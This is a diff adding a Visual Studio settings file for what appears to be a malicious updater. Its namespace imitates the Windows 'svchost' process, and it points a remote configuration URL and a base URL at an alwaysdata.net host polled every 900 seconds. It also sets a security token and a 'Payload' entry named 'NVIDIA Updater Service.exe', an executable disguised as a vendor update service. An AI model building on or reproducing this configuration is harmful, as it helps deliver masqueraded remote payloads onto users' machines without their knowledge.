@@ -1,0 +1,24 @@
+﻿<?xml version='1.0' encoding='utf-8'?>
+<SettingsFile xmlns="http://schemas.microsoft.com/VisualStudio/2004/01/settings" CurrentProfile="(Default)" GeneratedClassNamespace="Svchost.Update.Properties" GeneratedClassName="Settings">
+  <Profiles />
+  <Settings>
+    <Setting Name="Version" Type="System.Int32" Scope="User">
+      <Value Profile="(Default)">2</Value>
+    </Setting>
+    <Setting Name="CheckInterval" Type="System.Int32" Scope="User">
+      <Value Profile="(Default)">900</Value>
+    </Setting>
+    <Setting Name="RemoteConfigUri" Type="System.String" Scope="User">
+      <Value Profile="(Default)">http://pgeryfaut.alwaysdata.net/myapp/update.xml</Value>
+    </Setting>
+    <Setting Name="SecurityToken" Type="System.String" Scope="User">
+      <Value Profile="(Default)">D68EF3A7-E787-4CC4-B020-878BA649B4CD</Value>
+    </Setting>
+    <Setting Name="BaseUri" Type="System.String" Scope="User">
+      <Value Profile="(Default)">http://pgeryfaut.alwaysdata.net/myapp/</Value>
+    </Setting>
+    <Setting Name="Payload" Type="System.String" Scope="User">
+      <Value Profile="(Default)">NVIDIA Updater Service.exe</Value>
+    </Setting>
+  </Settings>
+</SettingsFile>
